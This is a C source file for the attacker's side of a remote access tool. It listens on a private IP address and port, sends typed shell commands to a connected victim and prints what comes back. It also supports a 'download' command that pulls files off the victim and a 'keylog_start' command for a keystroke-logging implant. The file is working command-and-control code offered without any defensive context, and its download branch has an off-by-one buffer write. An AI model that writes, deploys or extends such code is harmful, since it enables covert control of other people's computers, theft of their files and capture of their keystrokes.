#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {
    int sock, client_socket;
    char buffer[1024];
    char response[18384];
    struct sockaddr_in server_address, client_address;
    socklen_t client_length;
    int optval = 1;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Error creating socket");
        return 1;
    }

    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0) {
        perror("Error setting TCP socket options");
        close(sock);
        return 1;
    }

    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = inet_addr("192.168.23.130");
    server_address.sin_port = htons(50005);

    if (bind(sock, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
        perror("Error binding socket");
        close(sock);
        return 1;
    }

    if (listen(sock, 5) < 0) {
        perror("Error listening on socket");
        close(sock);
        return 1;
    }

    printf("Server listening on 192.168.23.130:50005\n");
    printf("Waiting for client connection...\n");

    client_length = sizeof(client_address);
    client_socket = accept(sock, (struct sockaddr*)&client_address, &client_length);
    if (client_socket < 0) {
        perror("Error accepting client");
        close(sock);
        return 1;
    }

    printf("Client connected: %s\n", inet_ntoa(client_address.sin_addr));

    while (1) {
        bzero(buffer, sizeof(buffer));
        bzero(response, sizeof(response));

        printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
        if (!fgets(buffer, sizeof(buffer), stdin)) {
            break;
        }

        buffer[strcspn(buffer, "\n")] = '\0';

        if (write(client_socket, buffer, strlen(buffer) + 1) < 0) {
            perror("Error sending command");
            break;
        }

        if (strncmp(buffer, "q", 1) == 0) {
            break;
        } else if (strncmp(buffer, "cd ", 3) == 0 || strncmp(buffer, "keylog_start", 12) == 0) {
            continue;
        } else if (strncmp(buffer, "download ", 9) == 0) {
            // Receive size
            bzero(response, sizeof(response));
            int bytes = recv(client_socket, response, sizeof(response), 0);
            if (bytes <= 0) {
                perror("Error receiving size");
                break;
            }
            response[bytes] = '\0';
            long size = atol(response);
            if (size > 0) {
                FILE* fp = fopen("downloaded_file", "wb");
                if (fp) {
                    long received = 0;
                    while (received < size) {
                        bytes = recv(client_socket, response, sizeof(response), 0);
                        if (bytes <= 0) {
                            perror("Error receiving file data");
                            break;
                        }
                        fwrite(response, 1, bytes, fp);
                        received += bytes;
                    }
                    fclose(fp);
                    printf("File downloaded successfully\n");
                } else {
                    printf("Failed to open file for writing\n");
                }
            } else {
                printf("Failed to download file\n");
            }
        } else {
            int bytes_received = recv(client_socket, response, sizeof(response) - 1, 0);
            if (bytes_received <= 0) {
                perror("Error receiving response or client disconnected");
                break;
            }
            response[bytes_received] = '\0';
            printf("%s", response);
        }
    }

    close(client_socket);
    close(sock);
    return 0;
}
